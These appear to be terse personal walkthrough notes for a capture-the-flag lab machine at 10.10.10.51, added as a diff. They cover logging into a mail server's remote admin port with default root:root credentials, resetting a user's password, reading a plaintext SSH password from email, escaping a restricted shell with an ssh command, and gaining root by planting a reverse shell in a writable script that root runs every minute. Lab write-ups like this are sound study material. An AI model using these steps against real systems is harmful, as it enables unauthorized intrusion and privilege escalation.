@@ -1,0 +1,29 @@
+james smtp:25, pop3:119, nntp:110, remote admin 2.3.2:4555
+useless webserver
+
+foothold:
+nc 10.10.10.51 4555
+login with default creds root:root
+listusers
+```
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+```
+setpassword mindy 12345678
+
+login to pop server with creds
+email shows mindy's password for ssh
+username: mindy
+pass: P@55W0rd1!2@
+
+rbash escape:
+ssh mindy@10.10.10.51 -t "bash --noprofile"
+
+priv esc:
+interesting writable file in /opt/tmp.py
+root runs the file every minute
+write reverse shell into file
+rooted
